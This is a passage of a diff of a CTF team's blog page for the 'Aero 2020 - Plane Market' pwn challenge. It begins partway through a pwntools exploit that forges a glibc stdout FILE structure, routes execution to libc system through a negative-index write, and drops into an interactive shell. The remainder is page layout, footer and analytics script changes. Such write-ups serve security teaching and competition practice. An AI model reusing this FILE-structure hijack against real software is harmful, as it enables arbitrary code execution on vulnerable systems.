class="line">        _IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]<span class="number">-0xea0</span>) <span class="comment"># _wide_data</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">        _IO_2_1_stdout_ += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">        _IO_2_1_stdout_ += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x200</span>) <span class="comment"># IO_helper_jumps</span></span><br><span class="line">        STDERR = p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stderr_'</span>]) <span class="comment"># stderr</span></span><br><span class="line">        STDOUT = p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]) <span class="comment"># stdout</span></span><br><span class="line">        STDIN = p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) <span class="comment"># stdin</span></span><br><span class="line">        INPUT = _IO_2_1_stdout_+STDERR+STDIN+STDOUT+p64(<span class="number">0</span>)*<span class="number">2</span>*<span class="number">17</span>+p64(<span class="number">0</span>)+p64(LIBC+<span class="number">0x80650</span>)+p64(LIBC+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">        change_plane_name(<span class="number">-2</span>, INPUT, <span class="keyword">False</span>)</span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
-<li><a href="https://vigneshsrao.github.io/babytcache/" target="_blank" rel="noopener">https://vigneshsrao.github.io/babytcache/</a> </li>
+<h3 id="references"><a class="markdownIt-Anchor" href="#references"></a> References</h3>
+<ul>
+<li><a href="https://vigneshsrao.github.io/babytcache/" target="_blank" rel="noopener">https://vigneshsrao.github.io/babytcache/</a></li>
 <li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/</a></li>
 </ul>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
       
     </div>
-    <footer class="article-footer">
-      <blockquote>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
   <ul class="post-copyright list-unstyled">
     
-    <li class="post-copyright-link">
-      <strong>Link to this article：</strong>
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
       <a href="https://teamrocketist.github.io/2020/03/01/Pwn-Aero-2020-Plane-Market/" title="[Pwn] Aero 2020 - Plane Market" target="_blank" rel="external">https://teamrocketist.github.io/2020/03/01/Pwn-Aero-2020-Plane-Market/</a>
     </li>
     
-    <!--li class="post-copyright-license">
+    <li class="post-copyright-license">
       <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
-    </li-->
+    </li>
   </ul>
 </blockquote>
 
@@ -469,93 +485,79 @@
 </div>
 
 
-    </footer>
+    </div>
   </article>
   
     
-  <div id="comments"></div>
+  <section id="comments">
+  	
+  </section>
 
-<!-- LiveRe City install code -->
-<!--<div id="comments">
-<div id="lv-container" data-id="city" data-uid="MTAyMC8zMDExMy82NjY4">
-	<script type="text/javascript">
-   (function(d, s) {
-       var j, e = d.getElementsByTagName(s)[0];
-
-       if (typeof LivereTower === 'function') { return; }
-
-       j = d.createElement(s);
-       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-       j.async = true;
-
-       e.parentNode.insertBefore(j, e);
-   })(document, 'script');
-	</script>
-<noscript> Please activate JavaScript for write a comment in LiveRe</noscript>
-</div>
-</div>-->
-<!-- completed City install code -->
-<div id="disqus_thread"></div>
-<script>
-
-/**
-*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
-/*
-var disqus_config = function () {
-this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
-this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-};
-*/
-(function() { // DON'T EDIT BELOW THIS LINE
-var d = document, s = d.createElement('script');
-s.src = 'https://teamrocketist.disqus.com/embed.js';
-s.setAttribute('data-timestamp', +new Date());
-(d.head || d.body).appendChild(s);
-})();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 
   
 </div>
 
   <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
   
   <ul class="pager pull-left">
     
     <li class="prev">
-      <a href="/2020/03/10/Pwn-UTCTF-2020-Cancelled/" title="[Pwn] UTCTF 2020 - Cancelled"><i class="fa fa-angle-left" aria-hidden="true"></i>&nbsp;&nbsp;Newer</a>
+      <a href="/2020/03/10/Pwn-UTCTF-2020-Cancelled/" title="[Pwn] UTCTF 2020 - Cancelled"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
     </li>
     
     
     <li class="next">
-      <a href="/2020/02/24/Pwn-Pragyan-2020-Hide-and-Seek/" title="[Pwn] Pragyan 2020 - Hide and Seek">Older&nbsp;&nbsp;<i class="fa fa-angle-right" aria-hidden="true"></i></a>
+      <a href="/2020/02/24/Pwn-Pragyan-2020-Hide-and-Seek/" title="[Pwn] Pragyan 2020 - Hide and Seek"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
+    
     
   </ul>
   
   
   
   <div class="bar-right">
+    
     <div class="share-component" data-sites="facebook,twitter" data-mobile-sites="facebook,twitter"></div>
+    
   </div>
-  
+  </div>
 </nav>
+  
 
-</section>
 
-  <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2022 TEAMROCKETIST
+        
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
 <script>
 window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 </script>
-
-<script src="/js/jquery.fancybox.min.js"></script>
-<script src="/js/plugin.js"></script>
+<script src="/js/plugin.min.js"></script>
 <script src="/js/application.js"></script>
 
-
-
-  <script>
+    <script>
 (function (window) {
     var INSIGHT_CONFIG = {
         TRANSLATION: {
@@ -576,9 +578,48 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
-<!-- Google Analytics -->
-<script type="text/javascript">
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+
+   
+
+
+
+
+   
+
+
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
+  <script>
+  //利用 FancyBox 实现点击图片放大
+  $(document).ready(function() {
+    $('article img').not('[hidden]').not('.panel-body img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+      var $imageWrapLink = $image.parent('a');
+      if ($imageWrapLink.length < 1) {
+        var src = this.getAttribute('src');
+        var idx = src.lastIndexOf('?');
+        if (idx != -1) {
+          src = src.substring(0, idx);
+        }
+        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+      }
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+        $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+    $().fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+    });
+  });
+  </script>
+
+
+
+    <script defer type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
 (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
 m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
 })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
@@ -587,7 +628,6 @@ ga('create', 'UA-104385070-1', 'auto');
 ga('send', 'pageview');
 
 </script>
-<!-- End Google Analytics -->
 
 
 
